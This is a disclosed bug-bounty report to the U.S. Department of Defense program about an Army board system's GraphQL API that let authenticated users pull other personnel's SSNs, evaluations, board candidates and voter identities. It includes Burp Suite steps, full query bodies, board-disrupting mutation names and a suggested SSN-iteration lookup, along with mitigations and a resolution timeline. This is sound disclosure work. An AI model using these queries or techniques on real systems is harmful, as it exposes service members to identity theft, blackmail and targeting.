---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/information-disclosure
  - env/web
substate: "resolved"
weakness: "Information Disclosure"
enriched: true
body: true
date: 2026-01-12
submitted: 2025-01-22T20:28:32.854Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "badlifeguard"
source: "https://hackerone.com/reports/2954320"
title: "ASBS viewing other soldiers PII/Board/Board Voters/ETC"
---
# ASBS viewing other soldiers PII/Board/Board Voters/ETC

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 6 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2026-01-12

- Report: [https://hackerone.com/reports/2954320](https://hackerone.com/reports/2954320)
- CWE: Information Disclosure
- Submitted: 2025-01-22T20:28:32.854Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Description:**
An authenticated user, could run GraphQL queries that return sensitive information on other users. 

**Steps to reproduce it**
Please see below.

## References
Using burp suite, an authenticated user is able to do a full introspection against the target. After the introspection, a user can use Burp Suite Repeater to create custom GraphQL Queries based on information they are trying to find. 
CWE-200, CWE-284, CWE-359

## Impact

This would allow an attacker to capture data of soldiers by DoDID, to then look up other soldier data to gather board information, SSN, Clearance information, Branch information.  If a user was able to grab their own information, they could make requests to find out who is included with their current board, review evaluations with a DODID, and look up who is voting on the board, or any board for that matter. 

Additionally, this vulnerability partially impacts all components within the DoD.
Army Personnel: Active, Reserve, National Guard, Civilians, Contractors
Air Force: Active, Civilians, Contractors (unvalidated Reserve, National Guard)
Navy: Reserve (unvalidated Active, National Guard, Civilians, Contractors)
Marines: (unvalidated Active, Reserve, National Guard, Civilians, Contractors)
Coast Guard: (unvalidated Active, Reserve, National Guard, Civilians, Contractors)
Spaceforce: Active (unvalidated Civilians, Contractors)
Dependents: Not impacted unless a valid LDAP entry.

If a legitimate bad actor wanted to, they could once again, create identities of people with SSNs, background check to find peoples location, but more importantly blackmail and intelligence targeting. 
Blackmail board members would be an idea- "Promote me or I release blackmail".
Intelligence targeting-Foreign adversaries would be interested in this information to build leverage on a soldier to blackmail them to giving up sensitive information.

## System Host(s)
██████████,████

## Affected Product(s) and Version(s)
1.09.00.0

## CVE Numbers


## Steps to Reproduce
Using Burp Suite
Login and Authenticate to https://█████████/

Once logged in, Burp suite > proxy > http history will show you the requests. Looking for host: ███. There will be a POST request to: ███████/████████/graphql. In that request body you can manipulate the request. 

With the use of Outlook address book, a user could get anyones DoDID from the Global Address Book, just by adding a contact to their address book and in the contact information, under certificates, it has their DODID appended to their certificate information (Not the vulnerability).

I have not included any screenshots at this moment, more information can be requested. Let me how how I can assist in this finding.

Some of the requests: Any "# " are blocked out for reporting purposes. 
Look up user by DoDID: Only returns Army
{"query":"query {\r\n    userByDodId(dodId: \"#########\") {\r\n        dodId\r\n        fullName\r\n        indivFirstName\r\n        indivLastName\r\n        indivMiddleName\r\n        personGuid\r\n    }\r\n}"}

Look up evaluations by DoDID: Only returns Army
{"query":"query {\r\n    evaluationsByDodId(dodId: \"#########\") {\r\n        aerCrsNm\r\n        apftDt \r\n        apftRsltCd\r\n        bodyFatStdCd\r\n        box1\r\n        box2\r\n        box3\r\n        box4\r\n        classId\r\n        classStandingNr\r\n        classStudentQy\r\n        cmtTx\r\n        docVrsnNr\r\n        dodIdNr\r\n        dualRtrRoleCd\r\n        dutyDescTx\r\n        dutyStationNm\r\n        evalId\r\n        evalPdEndDt \r\n        evalPdStDt \r\n        evalRecModDtm \r\n        evalRptGrpCd\r\n        evalRptRsnCd\r\n        evalRptRsnCdDesc\r\n        evalRptTypCd\r\n        evaluationGroupType\r\n        gpa\r\n        irCmtTx\r\n        irDutyTitle\r\n        irRankAb\r\n        jpmeIndCd\r\n        labelPercentage\r\n        manualUpload\r\n        milEdLvlCd\r\n        mosDsgTx\r\n        mpcCd\r\n        oerRefCd\r\n        physMeasHgtIn\r\n        physMeasWgtLb\r\n        rankAb\r\n        ratedFirstNm\r\n        ratedFullName\r\n        ratedLastNm\r\n        ratedMiddleNm\r\n        ratedMonths\r\n        ratedSuffix\r\n        raterDutyTitleTx\r\n        raterEvalRatedQy\r\n        raterFirstNm\r\n        raterFullName\r\n        raterLabel\r\n        raterLabelDesc\r\n        raterLastNm\r\n        raterMiddleNm\r\n        raterOffRatedQy\r\n        raterPerformanceComments\r\n        raterPotentialComments\r\n        raterRankAb\r\n        raterRankRatedQy\r\n        raterSuffix\r\n        reasonDescTx\r\n        rsDutyTitleTx\r\n        rsTotalArmyCompCd\r\n        seniorRaterDutyTitleTx\r\n        seniorRaterEvalRatedQy\r\n        seniorRaterFirstNm\r\n        seniorRaterFullName\r\n        seniorRaterLabel\r\n        seniorRaterLabelDesc\r\n        seniorRaterLastNm\r\n        seniorRaterMiddleNm\r\n        seniorRaterOffBasBrCd\r\n        seniorRaterOffRatedQy\r\n        seniorRaterPotentialComments\r\n        seniorRaterRankAb\r\n        seniorRaterRankRatedQy\r\n        seniorRaterSuffix\r\n        sharpStmtCd\r\n        srDutyTitleTx\r\n        srRankAb\r\n        stuIdLocCd\r\n        unitDsgTx\r\n    }\r\n}"}

Look up candidates per board GUID:
{"query":"query {\r\n    candidatesForBoard(boardGuid: \"#######-5881-4E16-9C6C-4BC53014E8CB\") {\r\n        basdDt \r\n        birthDt\r\n        boardCandidateGuid\r\n        cmsndOffBasicBrCd\r\n        cmsndOffBasicBrDesc\r\n        cmsndOffControlBrCd\r\n        cmsndOffDetailBrCd\r\n        dodId\r\n        dorDt\r\n        enlMosCd\r\n        enlPromMosId\r\n        indivFirstName\r\n        indivLastName\r\n        indivMiddleName\r\n        indivName\r\n        indivSuffixName\r\n        ipermsSyncDt\r\n        milRankCd\r\n        milRankDesc\r\n        milSvcCompoCd\r\n        milSvcCompoDesc\r\n        mpcCd\r\n        mpcDesc\r\n        orgSrcCd\r\n        primaryJobCode\r\n        promConsidRecmdCd\r\n        promotableStatus\r\n        recCreateDt\r\n        recCreateSource {\r\n            dodId\r\n            fullName\r\n            indivFirstName\r\n            indivLastName\r\n            indivMiddleName\r\n            personGuid\r\n        }\r\n        recDeleteInd\r\n        recUpdateDt\r\n        recUpdateSource {\r\n            dodId\r\n            fullName\r\n            indivFirstName\r\n            indivLastName\r\n            indivMiddleName\r\n            personGuid\r\n        }\r\n        secondaryJobCode\r\n        warrOffMosCd\r\n    }\r\n}"}

Look up board voters per board event GUID:
{"query":"query {\r\n    boardEventVoters(boardEventGuid: \"#######-5BF0-46C2-8C32-EDD4C89758F8\") {\r\n        boardEventGuid\r\n        boardEventVoterGuid\r\n        boardTeamMemberGuid\r\n        estTimeToFinish\r\n        numCandidatesDistributed\r\n        numCandidatesVoted\r\n        numInquiries # Long scalar\r\n        percentCandidatesVoted\r\n        recCreateDt \r\n        recCreateSource {\r\n            dodId\r\n            fullName\r\n            indivFirstName\r\n            indivLastName\r\n            indivMiddleName\r\n            personGuid\r\n        }\r\n        recDeleteInd\r\n        recUpdateDt \r\n        recUpdateSource {\r\n            dodId\r\n            fullName\r\n            indivFirstName\r\n            indivLastName\r\n            indivMiddleName\r\n            personGuid\r\n        }\r\n        voter {\r\n            dodId\r\n            fullName\r\n            indivFirstName\r\n            indivLastName\r\n            indivMiddleName\r\n            lastCheckedDt \r\n            personGuid\r\n            photo\r\n        }\r\n    }\r\n}"}


Look up LDAP person by DoDID: (Reference the impact of DoDIDs from above. Seems like anyone with an active directory account in the DOD)
{"query":"query {\r\n    findLdapPersonByDodId(dodId: \"#########\") {\r\n        accountType\r\n        babr\r\n        babrDesc\r\n        branchOfService\r\n        cmfDesc\r\n        cn\r\n        dymose\r\n        ediPi\r\n        emailServiceClass\r\n        enlistedPmos\r\n        fascn\r\n        givenName\r\n        macom\r\n        mail\r\n        middleName\r\n        occupationCode\r\n        officerPaoc\r\n        officerPaocDesc\r\n        personCategory\r\n        personCondType\r\n        personNickname\r\n        personaDisplayName\r\n        personaTitle\r\n        personaUid\r\n        personaUserName\r\n        ptc\r\n        rank\r\n        sn\r\n        ssn\r\n        status\r\n        uic\r\n        uid\r\n        userPrincipalName\r\n    }\r\n}"}

## Suggested Mitigation/Remediation Actions
Disable introspection on GraphQL, this will make it harder for an attacker to gain information on how the API works and reduces the risk of unwanted information disclosure.
Review the API's schema to make sure that it does not expose unintended fields to the public.
Make sure that suggestions are disabled. This prevents attackers from being able to use Clairvoyance or similar tools to glean information about the underlying schema. If you cannot disable suggestions directly in Apollo. See this https://github.com/apollographql/apollo-server/issues/3919#issuecomment-836503305 thread for a workaround.

Reference links:
https://portswigger.net/web-security/graphql#preventing-graphql-attacks
https://www.apollographql.com/blog/securing-your-graphql-api-from-malicious-queries

## Timeline

- **Report Filed**
- **2025-01-22** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2025-01-22** @badlifeguard: Additionally: Theres also other mutation commands that a user could really disrupt active boards. 

For example: approveBoardCandidateFile, addBoardTeamMember, DeleteBoardTeamMember, freezeBoard, removeBoardCandidateFile, etc.
- **Report Needs More Info**
- **Report New**
- **2025-01-23** @badlifeguard: █████████████
- **Report Severity Updated**
- **Report Triaged**
- **2025-02-01** @badlifeguard: Updating findings/impact to also include Pentagon personnel. ████████████████
- **2025-02-01** @badlifeguard: Please add other participants and contributors:
https://hackerone.com/theonetruepengu
https://hackerone.com/hxhbrofessor
- **2025-02-05** @agent-p1: Greetings!
@badlifeguard  Because of this report you have been selected as our Researcher of the Month. Would you like your name to be on the certificate that is tweeted out? If so, would you provide me your name for that? Do you have a twitter handle for us to tag you in? If you do not, or would not like to, then we would use you Hackerone username. Thank you!
Regards,
The DoD VDP team
- **2025-02-06** @badlifeguard: Thank you for the selection! My name is ████, no twitter handle, but feel free to use my Hackerone username. I think my username is also a twitter account that I dont control. Any idea on the backend if they have seen other people utilize this type of attack or details on how many actual records could have been exposed?
- **2025-02-06** @badlifeguard: Updates as I check in:
Introspection has been disabled.
-findLdapPersonByDodId Query has been changed, no longer exists, so harder to find if they changed the permissions or just changed the name (Just makes it harder from not having access to see if they fixed the vuln, or just hid it so someone authorized can still get results. )
-Even though they disabled usersByLastName still gives a user (Army only) to their personGuid, then attacker could use the query candidateFullByPersonGuid, and still get empID, MOS, DODID, HT/WT, military education, clearance level, and SSN. 
-Also, If I have someones social, or have a tool iterate through a social security format with the query findLdapPersonBySocial, I am able to still return records across the DOD. 

There is more maintenance scheduled today on the site, so we will see.
- **2025-02-18** @agent-p1: Greetings @badlifeguard , 

Please provide the full Post request and the screenshot of the issue you are claiming is still prevalent. Thank you for your time. 

Regards,
The VDP Team
- **2025-02-18** @badlifeguard: I will gather some screenshots and submit them. However, I feel like all they are going to do is change the query name and then there will be no way to validate that the permissions have changed, just means the queries might still have the same open permissions. 

Also, my army email is: ███
- **2025-02-19** @badlifeguard: This morning I tried to run some of the queries, and it shows a lot of access denied. Also looks like ASBS 2.0 1.11.00 has been deployed. I will need to run through all the queries. Some were denied, some were undefined.

█████
██████████
███
████
- **2025-02-19** @badlifeguard: Please add other participants and contributors:
https://hackerone.com/theonetruepengu
https://hackerone.com/hxhbrofessor
- **2025-02-21** @badlifeguard: I have done some retesting and seems like with the recent update they changed the name of some of the queries and now I am getting access denied. 

█████████████████████████████████████████████████
- **Report Resolved**
- **Agreed On Going Public**
- **2025-07-07** @badlifeguard: Any update on this disclosure?
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
- **2026-01-15** @thisispatrick: Greetings @badlifeguard 

After a full review of all Researcher of the Month submissions and impacts for the year of 2025, you have been selected as the 2025 DoD-VDP Researcher of the Year! Please let us know if you are interested. We will be announcing this soon and would appreciate if you do not disclose this information before we do. In addition to having another Twitter highlight, we would like to put you in our 2025 DC3 acknowledgements and mail you some swag. If you are interested in swag, we will need the following from you.

1. A head-shot photo to go with the write-up
2. A mailing address 
3. T-Shirt Size
4. Sweater Size 
5. Real name (if you want to be used in the write-up)

If you are not comfortable with sharing your address, we can send it to HackerOne instead for distribution. Please be advised that there may be a longer than normal wait time for mailing if you are outside of the U.S. 

Congratulations again. We look forward to hearing from you! 

Regards, 
The DoD VDP team
